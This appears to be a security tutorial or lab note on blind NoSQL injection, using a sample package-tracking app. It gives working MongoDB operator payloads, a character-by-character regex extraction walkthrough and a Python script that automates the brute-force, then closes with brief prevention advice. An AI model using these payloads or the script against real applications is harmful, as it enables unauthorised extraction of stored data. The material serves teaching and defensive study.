# Blind Data Extraction

Blind NoSQL injection occurs when we can inject queries but cannot directly see the results. Instead, we must infer information from the application's behavior (true/false responses).

## MangoPost Example

A package tracking application where you enter a tracking number to get shipment information.

### Vulnerable Query

The application sends JSON data (not URL-encoded) and likely queries:

```javascript
db.tracking.find({
    trackingNum: <trackingNum from JSON>
});
```

### Oracle-Based Extraction

We can ask the server true/false questions and infer data from responses:

**True response** (package exists):
```json
{"trackingNum": {"$ne": "x"}}
```

**False response** (no package):
```json
{"trackingNum": {"$eq": "x"}}
```

## Character-by-Character Extraction

### Step 1: Find Any Package

Start with a regex that matches all documents:

```json
{"trackingNum": {"$regex": "^.*"}}
```

This returns Franz Pflaumenbaum's package info.

### Step 2: Extract First Character

Test each possible first character:

```json
{"trackingNum": {"$regex": "^0.*"}}  // No match
{"trackingNum": {"$regex": "^1.*"}}  // No match  
{"trackingNum": {"$regex": "^2.*"}}  // No match
{"trackingNum": {"$regex": "^3.*"}}  // Match! First char is '3'
```

### Step 3: Extract Second Character

Continue with the known first character:

```json
{"trackingNum": {"$regex": "^30.*"}}  // No match
{"trackingNum": {"$regex": "^31.*"}}  // No match
{"trackingNum": {"$regex": "^32.*"}}  // Match! Second char is '2'
```

### Step 4: Continue Until Complete

Repeat the process for each character position:

```json
{"trackingNum": {"$regex": "^32A.*"}}   // Third char is 'A'
{"trackingNum": {"$regex": "^32A7.*"}}  // Fourth char is '7'
{"trackingNum": {"$regex": "^32A76.*"}} // Fifth char is '6'
{"trackingNum": {"$regex": "^32A766.*"}} // Sixth char is '6'
```

### Step 5: Verify Complete String

Use `$` to mark end of string:

```json
{"trackingNum": {"$regex": "^32A766$"}}  // Verify complete tracking number
```

## Character Set Considerations

When extracting data, consider:

- **Numbers**: 0-9
- **Letters**: A-Z, a-z  
- **Special characters**: Based on application context
- **Case sensitivity**: Test both uppercase and lowercase

## Automation Script Template

```python
import requests
import string

def blind_extract(base_url, target_regex):
    """Extract data using blind NoSQL injection"""
    characters = string.ascii_letters + string.digits + "_-"
    extracted = ""
    
    while True:
        found = False
        for char in characters:
            test_regex = f"^{extracted}{char}.*"
            payload = {"trackingNum": {"$regex": test_regex}}
            
            response = requests.post(base_url, json=payload)
            
            if "package info" in response.text:  # Success indicator
                extracted += char
                found = True
                print(f"Found: {extracted}")
                break
        
        if not found:
            break
    
    return extracted
```

## Key Points

- **Oracle responses**: Use application behavior to infer data
- **Regex anchoring**: Use `^` for start, `$` for end of string
- **Character sets**: Test numbers, letters, and special characters
- **Automation**: Script the process for efficiency
- **Verification**: Always verify complete strings with `$` anchor

## Prevention

- Validate and sanitize all user input
- Use parameterized queries
- Implement rate limiting to prevent automated attacks
- Log and monitor suspicious query patterns
- Consider using MongoDB's built-in security features
